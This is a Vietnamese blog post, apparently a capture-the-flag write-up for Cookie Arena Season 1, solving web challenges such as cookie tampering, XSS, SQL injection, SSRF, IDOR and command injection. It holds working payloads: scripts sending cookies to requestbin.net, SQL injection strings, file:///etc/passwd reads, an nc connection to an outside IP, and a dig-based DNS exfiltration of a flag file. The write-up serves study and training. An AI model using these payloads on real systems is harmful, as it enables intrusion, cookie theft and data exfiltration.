---
layout: post
title: "[WRITEUP COOKIE ARENA SS1 2021]"
categories: CTF
toc: true
---

Đây là mùa đầu tiên của cookie arena và mình may mắn đã giải được hết các challenge của CTF này. Và dưới đây và writeup của một số challenge mình đã giải được.

Btw, Khá may mắn khi mình leo được top 1
![image](https://user-images.githubusercontent.com/54855855/140301444-e9b4c53a-b0aa-4e30-8557-37ce10b4f68b.png)

Tổng hợp payload mình sẽ để ở đây [SRC](https://github.com/DauHoangTai/WriteupCTF/tree/master/wargame/CookieArenaSS1)

<h1>WEB BASIC</h1>

## Challenge Hân Hoan
Truy cập vô url thì nhận được 1 form đăng nhập và thử đăng nhập với username và password bất kì và nhận được output sau.
![image](https://user-images.githubusercontent.com/54855855/140048108-d19f362d-8a59-4a2c-a3ff-b0a963374c69.png)

=> có vẻ thứ gì đó cần là `CookieHanHoan`
![image](https://user-images.githubusercontent.com/54855855/140049047-375ec994-faf5-4862-a463-f960a10f282f.png)

Sử dụng `Editthiscookie` thì thấy cookie Role đang là Guest => chỉ cần đổi Guest thành `CookieHanHoan` lưu lại và request lại => có flag

### Flag
`Flag{Cookies_Yummy_Cookies_Yammy!}`

## Challenge Header 401
Chú ý ở view-source của challenge thì thấy được
![image](https://user-images.githubusercontent.com/54855855/140087034-3332dbb6-3dee-4bb5-88f5-a24136894f19.png)

2 thứ ở trên gợi ý cho chúng ta đang sử dụng GET method và cần phải có `Authorization`.

Cấu trúc của Authorization các bạn có thể đọc ở đây [Authorization](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Authorization)

Ở bài này chỉ cần đổi method thành POST và thêm header `Authorization` là có thể lấy flag.

### Payload
![image](https://user-images.githubusercontent.com/54855855/140088191-22bfe88b-1928-45de-b988-4a5c23be72ed.png)
Khi send với method POST thì cần thêm header `Content-Type: application/x-www-form-urlencoded`

`Z2Fjb25sb250b246Y29va2llaGFuaG9hbg==` là `gaconlonton:cookiehanhoan` base64 encode.

### Flag
`Flag{m4g1c@l_h34d3r_xD}`

## Challenge JS B**p B**p
Kiểm view-source thì thấy dẫn link 4 file js. 4 file đều chứa các kí tự gì đó rất lạ. Nhưng theo kinh nghiệm mình chơi thì đây là JS Fuck, tới đây thì lên mạng kiếm tool decode nó thôi

Tool mình để decode đây nha [JSFUCK](https://enkhee-osiris.github.io/Decoder-JSFuck/)

Sau khi decode thì thấy được:
- File 1.js: chứa username là `cookiehanhoan`
- File 2.js: 1 hàm `reverseString`
- File 3.js: verify password sau khi reverse. Ở đây mình cần reverse chuỗi `dr0Wss@p3rucreSr3pus`.
![image](https://user-images.githubusercontent.com/54855855/140094948-0892a88b-494e-4f20-b98a-85623e5299b7.png)
=> `sup3rSercur3p@ssW0rd` là password
- File 4.js: verify role, đoạn này đọc code và phân tích 1 chút thì biết được role là `@dmiN`.

### Payload
Đăng nhâp với tất cả thông tin trên thì sẽ có flag
`username=cookiehanhoan&password=sup3rSercur3p@ssW0rd&role=@dmiN`

### Flag
`Flag{JAV-ascript_F*ck}`

## Challenge Impossible
Ở trang chủ thì sẽ có 1 ô để nhập password nhưng nhập bất kì sẽ không được xủ lí.
![image](https://user-images.githubusercontent.com/54855855/140089327-8cfd0f3f-a459-4e78-95d1-a5958558ede9.png)

Chú ý ở view-source thì thấy được 1 function `checkPass` và đây là xử lí cái password của mình đưa vào. Phân tích về đoạn code đó như sau:
- Đầu tiên sẽ nhận giá trị của mình đưa vào
- Ở `if` sẽ check `password` mình đưa vào có chưa chuỗi `cookiehanhoan` không, nếu có sẽ replace thành trống và hàm `btoa` là base64 encode cái password sau khi replace.
- Cuối cùng sẽ check chuỗi base64 đó có bằng với `Y29va2llaGFuaG9hbg==`.

### Payload
Mình nhập vào password `cookiecookiehanhoanhanhoan`. Giải thích về payload này là sau khi nhập chuỗi trên vào, đến đoạn replace thì chuỗi `cookiehanhoan` ở giữa sẽ bị mất và cuối cùng chỉ còn là `cookie` và `hanhoan`, ghép lại `cookiehanhoan`.

### Flag 
`Flag{Javascript_is_not_safe???}`

## Challenge Infinite Loop
Ở bài này lại có 1 form đăng nhập và mình thử đăng nhập với username và password bất kì. Chú ý response của web thì cứ tầm vài giây là id sẽ được thay đổi => giống như tên bài loop :)

Tới đây dùng burp để bắt response lại. Sau khi login vô và chú ý ở tab `HTTP history` thì thấy được id sẽ nhảy rất nhiều
![image](https://user-images.githubusercontent.com/54855855/140091415-6b0916b2-a3d9-434c-b1b1-4400e21a2944.png)

Giờ mình sẽ chuyển 1 request qua tab `repeater` để quan sát và chỉnh sửa request. 

Sau khi chuyển qua và send request thì thấy được
![image](https://user-images.githubusercontent.com/54855855/140091834-a0706df6-b14c-4852-9688-26ceb5ce55da.png)

Trang web nó vẫn đang 302 (redirect) tiếp. Mình cứ ấn `Follow redirection` tới khi nào có flag thì thôi :)

Cuối cùng khi `id=6` thì sẽ có flag

### Flag
`Flag{Y0u_c4ptur3_m3_xD!!!}`

## Challenge I am not a robot
Bài này tên bài có liên quan đến robot nên mình đoán luôn là có thể flag ở `robots.txt`.
![image](https://user-images.githubusercontent.com/54855855/140092817-7b48e27b-c1d3-449a-8143-2df64f0454fa.png)

Thử thì có thấy Allow có 1 path chuyển tới flag => truy cập nó và có flag
![image](https://user-images.githubusercontent.com/54855855/140092706-b1d0f229-62a5-4f0c-9c49-47731179d966.png)

Ở bài này các bạn có thể sử dụng `Dirsearch` để scan ra cái `robots.txt` nhé.

### Flag
`Flag{N0_B0T_@ll0w}`

## Challenge Sause
Ở bài này chỉ cần view-source lên thì có thể thấy flag
![image](https://user-images.githubusercontent.com/54855855/140093164-0c3be5c8-8fa4-43f1-a957-b850caa914c4.png)

### Flag
`Flag{Web_Sause_Delicious}`

<h1>Web Exploitation</h1>
5 bài đầu này vì server của các challenge đang sập nên mình chỉ nhớ lại và viết payload thôi nhé, mong các bạn thông cảm.

## Challenge XSS
ở bài này author cho tên bài là xss luôn nên mình vô thử thẳng `<script>alert(1);</script>` và web hiện ra thông báo popup `1` => trigger xss thành công

Vậy bây giờ chỉ cần lấy cookie và có thể đó là flag.

### Payload
Tạo 1 requestbin ở trang này [Requestbin](https://requestbin.net/)

Sau đó send payload sau: `<script>document.location='https://requestbin.net/r/bkctjaky?cc='+document.cookie</script>`

Chờ khoảng vài phút thì có flag về.

## Challenge XSS Filter
Bài này khác bài trên khi mình nhập vào `<script>alert(1);</script>` thì web vẫn không thông báo popup cho mình. Bật console lên thử nhập lại thì thấy có [CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP), nonce phải bằng `matuhn`.

Sau khi biết `nonce="matuhn"` thì chúng ta thử lại với payload sau:

```
<script nonce="matuhn">alert(1);</script>
```
Kết qủa web trả về thông báo popup `1` như bài `XSS` => trigger xss thành công. Bây giờ chỉ cần lấy cookie như bài XSS thôi

Các bạn có thể kiểm tra csp bằng cách xem header cũng được nhé.

### Payload
```
<script nonce="matuhn">document.location='https://requestbin.net/r/1vg7yclv?data='+document.cookie</script>
```
Các bạn nhớ vô trang [Requestbin](https://requestbin.net/) tạo 1 requestbin cho riêng minh và thay vào payload trên nha.

## Challenge Ét Quy Eo
Như tên bài thì bài này có thể là `SQL Injection`. Truy cập vào chall thì có 1 form đăng nhập gồm `username` và `password`.

Mình nhớ là thử input vô username `'` thì có thông báo lỗi của `sql` => sql injection

### Payload
```
username=' or 1=1--&password=' or 1=1--
```
Câu query trong server có thể như sau:

```sql
SELECT username,password from users where username='{username}' and password='{password}'
```

## Challenge SQL Filter
Ở bài như tên bài thì sẽ có 1 số filter, thử lại payload `' or 1=1--` thì không thể lấy flag như bài cũ mà sẽ trả về `hack detect` (mình nhớ là vậy), tất nhiên rồi như vậy thì filter làm gì :D 

Tới đây mình kiểm tra xem các char nào bị filter thì thấy được một số char như sau:
- `khoảng trắng`, `or` và `Or`.
- nhưng khi mình nhập `OR` hoặc `oR` thì không bị filter.

### Payload
Để bypass 1 các char ở trên:
- `khoảng trắng` -> `/**/`
- `or` -> `OR` hoặc `oR`

```
username='/**/oR/**/1=1--&password='/**/oR/**/1=1--
```
Câu query sql thì có thể vẫn sẽ giống như bài trên nhưng sẽ có thêm 1 đoạn kiểu kiểu như này

```py
#!/usr/bin/env python3
myInput = "' or 1=1--"
blacklist = ['or', 'Or', '\'',' ']

for i in blacklist:
	if i in test:
		print('hack detect')
```

## Challenge Misconfiguration
Như tên bài thì bài này có thể liên quan đến các file `config` của web. 

Ở đây mình sử dụng `Dirsearch` để scan ra có các path nào và nhận được 2 path: `.htaccess` (file congfig của Apache Web Server) và `web.config` (file config của ASP.NET)

### Payload
Có 3 part flag:
- part 1: `http://chal16.web.letspentest.org/.htaccess`
- part 2: `http://chal16.web.letspentest.org/web.config`
- part 3: Ở trong `/web.config` có 1 path nữa là `.bak` gì đó, truy cập vào và nó sẽ tải 1 file `.bak` về, đổi đuôi file thành `.zip` và giải nén sẽ có part 3.

## Challenge Paparazzi
Truy cập challenge thì chương trình có chức năng nhập một url vào, nếu như không phải như 1 url thì sẽ thông báo `invalid url`

![image](https://user-images.githubusercontent.com/54855855/140245626-fdf68e3c-df23-436f-a3a5-b8be08bb2af9.png)

Cấu trúc 1 url cơ bản sẽ như sau:

![image](https://user-images.githubusercontent.com/54855855/140245902-369a4637-9505-4f5b-8481-dc6b39e10714.png)
- Phần đầu: `Schema`
- Phần còn lại: `Authority`

Tới đây mình thử nhập vào url `http://google.com`

![image](https://user-images.githubusercontent.com/54855855/140247091-1b129573-e60f-4b41-8ae5-29234171f90a.png)
Chương trinh sẽ trả về 1 file `.png`. Ở trang chủ nếu bật view-source thì sẽ thấy 1 `api` function `getHistory` -> `/get_screenshot?file=file được trả về`.
![image](https://user-images.githubusercontent.com/54855855/140246799-7b318d07-dd26-4c11-9519-6090efdd9b02.png)
Kết quả thấy được sẽ có capture của trang `google.com`. Tới đây mình đoán bài này có thể là `SSRF`.

Tiếp tục mình thử một số thứ như `http://127.0.0.1` thì nhận được kết quả `invalid url` và thử một số payload ssrf khác để truy cập local thì vẫn như vậy.

Tới đây mình thử sử dụng `file://` để đọc file xem được không. 
![image](https://user-images.githubusercontent.com/54855855/140248266-a7e0c839-4de9-40d4-a405-23efdfc234ed.png)
Và kết quả đọc được file `/etc/passwd`. Nhưng điều quan trọng, flag ở đâu để đọc đó.

Sau một hồi capture một số chỗ như:
- `/`
- `/etc`
- `/root`
- `/home`

Thì đều không có flag ở đó. Cuối cùng mình nghĩ flag có thể ở thư mục hiện tại mà chương trình đang làm việc, và theo mình thì author deploy bài này bằng docker nên mình sẽ thử `file:///proc/1/cwd`. Ở đây giải thích sơ qua về payload trên:
- `PID 1` trong trong docker chính là thư mục hiện tại mà process đang chạy

![image](https://user-images.githubusercontent.com/54855855/140250117-812745ca-aacd-4ff8-a35d-ae7c92f4c715.png)
Có một folder lạ và thử capture tiếp thì thấy được `flag.txt` trong đó.

Mình sẽ mô tả đơn giản lại đoạn code ssrf này như sau:

```py
#!/usr/bin/env python
import requests
import urllib

url = 'file:///etc/passwd'
print(urllib.urlopen(url).read())
```

### Payload
```
file:///etc/passwd -> xác nhận có thể sài file để đọc

file:///proc/1/cwd -> tìm folder chứa flag

file:////proc/1/cwd/Th1s_1s_sEcreT_pAth_c4n_Gu3sss_17831278392131/flag.txt -> đọc flag
```

### Flag
`FLAG{abc725173fa1828ea019503669b4eecd}`

## Challenge Gatling gun
Bài này có một form đăng nhập gồm `username, password, ip`. Thử một số payload đơn giản của sql injection thì không thấy thông báo lỗi gì của sql mà chỉ là `FLAG{Not_True}`.

Đọc description thì thấy có vẻ như những thông tin đăng nhập nằm ở github của cookiehanhoan. Vậy việc đầu tiên là cần tìm link github đó.

Và đúng như mình nghĩ thì user pass và ip đều ở trong github này [github](https://github.com/cookiehanhoan/HoangTuEch). Tới đây mình chỉ cần thử brute xem account nào đúng và trả về flag thôi.

### Payload
Ở đây mình dùng burp để brute cho nhanh luôn nhé.
![image](https://user-images.githubusercontent.com/54855855/140252108-98e8cf9f-9c5d-49d7-8084-e8f54f212bc6.png)
- Đầu tiên chuyển request qua tab `intruder` và tab `Positions`
- Set `Attack type` là `Cluster bomb`
- Set 3 vị trí cần brute

![image](https://user-images.githubusercontent.com/54855855/140252367-09aa880c-cc26-44b5-86cc-d101185e161b.png)
- Tiếp tục qua tab `Payloads`
- `Payload set` là 1
- Copy username ở bên github và paste vào.

Tăng `payload set` lên 2 và copy password vào, tương tự cho ip là tăng lên 3. Cuối cùng là `Start attack` thôi. Khoảng 1p là xong.
![image](https://user-images.githubusercontent.com/54855855/140252723-5382e36e-b86b-41f5-b6ac-43b556fde69b.png)

### Flag
`FLAG{e6c068faf9241fe9d1f2000516718377}`

## Challenge The maze runner
Ở bài này chỉ là các tên folder và file là các kí tự xếp lại không có nghĩa. Ở bài này mình rảnh nên mình sài tay click từng cái và kiếm flag.

Với trường hợp nếu như folder quá nhiều và chứa rất nhiều file khác nữa thì các bạn có thể `wget` nó về và sử dụng command để tìm nhé, sẽ nhanh hơn. 

### Payload
```
http://chal10.web.letspentest.org/MS70RIE/2D5TA9DK/UGR85I0H/60ADG
```

### Flag
`FLAG{6059e2117ea3eeecdad7faf1e15d16a2}`

## Challenge ID'OR1=1
Bài cho chúng ta nhập vào `id` và in ra thông tin của id đó. Mình thử một số payload của sqli thì không có gì => thử brute id có thể flag nằm ở 1 id nào đó, dạng này còn gọi là [IDOR](https://portswigger.net/web-security/access-control/idor)

### Payload
Vì server đang sập nên mình không thể brute bằng burp mà chỉ nhớ lại và viết một đoạn code exploit bằng python3 dưới đây nhé

```py
#!/usr/bin/env python3
import requests

URL = 'http://chal11.web.letspentest.org/user'

for i in range(1,5000):
	print(i,end='\r')
	params = {'id':f'{i}'}
	r = requests.get(URL, params=params)
	if 'flag{' in r.text:
		print(r.text)
		break
```
Mình nhớ là `id=1337` là sẽ có flag

### Flag
`Flag{61cb4a784e83b6109999af6f036b88bf}`

## Challenge A tiny hole
Ở bài này được author cho source nên mình khá là thích, vì có source biết chương trình đang làm gì và có thể debug trên local.

Đầu tiên mình deploy trên local để làm cũng vì mới mở không lâu lắm thì server bị sập.
- Cần đổi đoạn return ở hàm `index` này về string bất kì vì chúng ta không có file `index.html` hoặc các bạn có thể tạo file `index.html`.
![image](https://user-images.githubusercontent.com/54855855/140258145-2a3b30b1-4489-4280-afcf-284112b7c213.png)
- Chạy với command `python3 app.py`, nếu như bị hiện lỗi thiếu lib thì các bạn thử với `python3 -m pip install tênlib`

Tới đây mình sẽ phân tích source code 1 xíu nhé:
![image](https://user-images.githubusercontent.com/54855855/140265539-15c88c81-1c8a-4b5d-8434-b58b97ab74cd.png)
- Ở đoạn này chỉ gán cho `home` là đường dẫn mà thư mục `app.py` đang chạy, cụ thể là gán `home='/src'` như author comment.

![image](https://user-images.githubusercontent.com/54855855/140265716-9cdc0795-a6e5-49aa-ac1a-212be7748e1b.png)
- Route `/` có chức năng chỉ là render ra template `index.html`

```py
@app.route('/runScript', methods=['POST'])
def runScript(): # nhận 4 tham số của mình nhập vào
	dir = flask.request.form.get('script_dir')
	name = flask.request.form.get('script_name')
	url = flask.request.form.get('script_url')
	command_log = flask.request.form.get('command_log_file')
	msg = start(dir, name, url, command_log)
	return ({'status': msg},200)

def check_script_dup(scripts, command_log, dir, name, url): # check file nhập vào đã tồn tại chưa.
	try:
		script_parent_dir = scripts + '/' + dir # /src/scripts/{script_dir_nhapvao}
		script_path = script_parent_dir + '/' + name # /src/scripts/{script_dir_nhapvao}/{script_name_nhapvao}
	except:
		return "missing dir and name"
	if os.path.exists(script_path):
		return "duplicate script"
	else:
		if not os.path.exists(script_parent_dir):
			os.makedirs(script_parent_dir)
		return download_script(script_path, command_log, url)

def download_script(script_path, command_log, url):
	try:
		script_link = url # script_url mình nhập vào
	except:
		return "missing url"
	r = requests.Session()
	r.mount('file://', FileAdapter()) # cho phép truy cập filesystem local via file://
	try:
		result = r.get(script_link)  # request vào url mà mình nhập
	except:
		return "Oh no! Lost internet"
	with open(script_path, 'wb') as f: # ghi content của url trả về vô file mình nhập.
		f.write(result.content)
		run_script(script_path, command_log)

def run_script(script_path, command_log):
	lf = open(command_log, 'wb+') # mở file log mình nhập vào
	command = subprocess.Popen(['bash', script_path], stderr=lf, stdout=lf, universal_newlines=True) # chạy lệnh bash và ghi output các error vào file log
	return "Run successfully"

def start(dir, name, url, command_log):
	scripts = home + '/scripts'   # /src/scripts
	log = home + '/logs'		  # /src/logs
	if not os.path.exists(scripts): # check folder scripts nếu chưa có tạo folder
		os.makedirs(scripts)
	if not os.path.exists(log):		# check folder logs nếu chưa có tạo folder
		os.makedirs(log)
	try:
		command_log = log + '/' + command_log + '.txt'  # /src/logs/{command_log_file_nhapvao}.txt
	except:
		return "missing command_log"
	msg = check_script_dup(scripts, command_log, dir, name, url)
	return msg
```
- Đoạn code này mình sẽ gộp chung 5 function này vì ở route `/runScript` này 5 function đều liên quan đến nhau. 

Mình có comment trên source luồng hoạt động của code khi mình giải bài nhưng mình sẽ giải thích lại ở dưới này (nhớ vừa đọc đoạn này vừa nhìn trên code mình comment cho dễ hiểu nhé):
- Function `runScript` nhận 3 tham số do người dùng nhập vào `script_dir`, `script_name`, `script_url`, `command_log_file` (các bạn có thể thấy ở form index.html hay còn nói cách khác là ở trang chủ). Sau đó đưa 4 tham số đó cho function `start`.

- Function `start` sau khi nhận 4 tham số thì chỉ check xem 2 đường dẫn `scripts` và `log` được tạo chưa, nếu chưa thì sẽ tạo ra 2 folder đó. Cụ thể là `/src/scripts` và `/src/logs`. Tiếp theo là sẽ khởi tạo lại biến `command_log=log + '/' + command_log + '.txt'` (thêm .txt vào cuối), cụ thể là `/src/logs/command_logbandau.txt`. Cuối cùng đưa lại 5 tham số `scripts, command_log, dir, name, url` vào hàm `check_script_dup`, nhưng chỉ có `scripts` và `command_log` là thay đổi còn lại giữ nguyên.

- Function `check_script_dup` chỉ đơn giản là check file mình nhập vào ở `script_name` đã tồn tại chưa, nếu có rồi sẽ in `duplicate script`. Chưa có thì sẽ đưa vào hàm `download_script`.

- Function `download_script` nhận 3 tham số `script_path`, `command_log`, `url` và cụ thể giá trị của 3 tham số đó được đưa vào như sau (hoặc có thể thấy comment trên code):
    - `script_path` -> `/src/scripts/{script_dir_nhapvao}/{script_name_nhapvao}`
    - `command_log` -> `/src/logs/{command_log_file_nhapvao}.txt`
    - `url` -> `script_url` mà mình nhập vào.

    ```py
    r = requests.Session()
	r.mount('file://', FileAdapter())
    ```
    - 2 dòng code này để cho phép truy cập filesystem local via file://
    - Và cuối cùng ở function này sẽ truy cập vào `url` mà mình nhập vào sau đó mở file mình nhập vào và ghi content của url trả về vô đó.

- Function `run_script` có nhiệm vụ mở file `log` mình nhập vào sau đó chạy lệnh bash với nội dung của file đã ghi vào `script_path`, cuối cùng lưu output và error vào file `command_log`.

### IDEA
Ghi error vào file log và gọi lại lần 2 để `bash` thực hiện file chứ nội dung file log đó

Chúng ta sẽ cần 2 request:
- Request 1: Nhập command vào `script_name` nằm trong dấu backticks (``), khi chạy `bash` với `script_name` nó sẽ kiểu như sau:
    - bash /src/scripts/taidh/\`id\` -> `taidh` ở đây là cái `script_dir` mình nhập vào.
    ![image](https://user-images.githubusercontent.com/54855855/140279649-84f49cfc-2a1d-4569-8e30-aced3140725a.png)
    - Như ảnh trên thì các bạn có thể thấy command id nằm trong backticks đã được thực thi.
    - Vậy bây giờ mình thử payload lên local của mình đã dựng
    ![image](https://user-images.githubusercontent.com/54855855/140279940-d8f65b14-e254-4686-8c4e-7850ded09aa2.png)
    - Sau khi chạy request thì check trong server mình dựng thấy file `log1.txt` có chứa \`id\` giống như lúc đầu mình test.
    ![image](https://user-images.githubusercontent.com/54855855/140280371-7298a9b3-ffec-4611-bdc4-4028110fe58a.png)
    - Vậy giờ làm sao để nó thực thi cái file này mà chạy được cái id kia => cần `request 2`
- Request 2: Ở request này chúng ta chỉ cần đổi `script_name` và `script_url`
    - thay `script_name` bằng tên bất kì.
    - `script_url` -> `file:///home/taidh/cookiehanhoan/logs/log1.txt` (dường dẫn đến file `log1` ở request 1). Có thể kiểm tra đường dẫn bằng cách sau
    ![image](https://user-images.githubusercontent.com/54855855/140282707-6dcdbdd1-b9d1-4618-b0e5-bc8568d4c7e7.png)
    - Payload ở request 2 sẽ kiểu như này 
    ![image](https://user-images.githubusercontent.com/54855855/140282938-9317535f-94cd-4fc5-8e00-6a64c97da947.png)
    - Giải thích ở request 2 này nó sẽ hoạt động như sau:
        - Ở function `download_script` nó sẽ ghi cái nội dung của file `log1.txt` mà mình chụp ở trên vô file `abd` sau đó `bash` sẽ chạy file `abd` đó.
        - Tương tự như dưới đây
        ![image](https://user-images.githubusercontent.com/54855855/140283951-0462115e-1411-409c-a550-c2be17971e4a.png)
    - Khi send xong request 2 vì chương trình ko in ra kết quả trả về nên chúng ta cần [reverse shell](https://www.netsparker.com/blog/web-security/understanding-reverse-shells/#:~:text=to%20prevent%20them.-,A%20reverse%20shell%20is%20a%20shell%20session%20established%20on%20a,machine%20and%20continue%20their%20attack.)

### Payload ở local
Đầu tiên thử lại `nc` trên local của mình.

Cần chạy command `nc -lvn 4444`
```
+ Request 1:
script_dir=taidh1&script_name=`nc 52.231.78.247 4444`&script_url=file:///etc/hosts&command_log_file=log2

+ Request 2:
script_dir=taidh1&script_name=abd&script_url=file:///home/taidh/cookiehanhoan/logs/log2.txt&command_log_file=log1
```
Sau khi send request 2 thì nhận được ![image](https://user-images.githubusercontent.com/54855855/140291936-a1c40d49-f8d6-4989-842a-aea2a0169cc3.png)

 Như vậy là đã `nc` thành công trên local giờ lên server thui

### Payload ở server
Vẫn giữ nguyên `nc -lvn 4444`

```
+ Request 1:
script_dir=taidh&script_name=`nc+52.231.78.247+4444`&script_url=file:///etc/hosts&command_log_file=log1

+ Request 2:
script_dir=taidh&script_name=abd&script_url=file:///src/logs/log1.txt&command_log_file=log1

Ở đây mình thay thành file:///src vì thư mục mà app đang chạy ở đây nhé.
```

Nhưng sau khi send thì vẫn không có request đến nc mình đang listen, thử curl hay wget.. cũng không được => mình nghĩ trên server không có `oob` => không thể `reverse shell` => mình quyết định thử `dns`.

### Final payload
Tạo 1 subdomain thông qua [requestrepo](http://requestrepo.com/#/)

Dưới đây là payload đọc luôn flag nhé, các bạn muốn chạy lệnh khác thì thay vào chỗ xargs `cat` và echo -e `\x2fflag.txt`. Mình sài `\x2f` thay cho `/` vì khi đưa `/` vào payload thì server trả về status 500.

Cuối cùng nhớ thay `subdomain`, `script_dir` và `command_log_file` ở request 1 nhé.

```
+ Request 1:
script_dir=taidh27&script_name=`dig+$(echo+-e+"\x2fflag.txt"+|+xargs+cat+|+xxd+-p+-c10000+|+cut+-c1-60).1e2c0c0j.requestrepo.com`&script_url=file:///etc/hosts&command_log_file=file27&submit=Submit

+ Request 2:
script_dir=taidh27&script_name=aaa&script_url=file:///src/logs/file27.txt&command_log_file=file4&submit=Submit
```
![image](https://user-images.githubusercontent.com/54855855/140298470-d64695e7-4ca9-475c-b25c-03adbd28357b.png)

Copy chuỗi hex này, vô [Cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=NDY2YzYxNjc3YjQzNmY2ZjZiNjk2NTU3NjE3MjcyNjk2ZjcyNWY1MDZjNjU2MTczNjU1ZjU0Njg2OTZl) để decode và nhận được 1 nửa flag.

Các bạn tiếp tục lại với payload trên và thay `c1-60` thành `c61-100` và thay `script_dir`, `command_log_file` để khỏi bị duplicate và nhận nửa flag còn lại nhé.

Để tham khảo về backticks là gì thì mọi người vô đây đọc nha [Backticks](https://qastack.vn/unix/27428/what-does-backquote-backtick-mean-in-commands)

### Flag
`Flag{CookieWarrior_Please_Think_Out_Of_The_Box}`

## Lời kết
Cảm ơn Cookie Hân Hoan đã tạo sân chơi về security cho các bạn trẻ như em có nơi để luyện tập và học hỏi thêm điều mới. Cũng như cảm ơn đến anh Đoàn Lê Mạnh Tùng đã tạo ra nhiều challenge web hấp dẫn. 
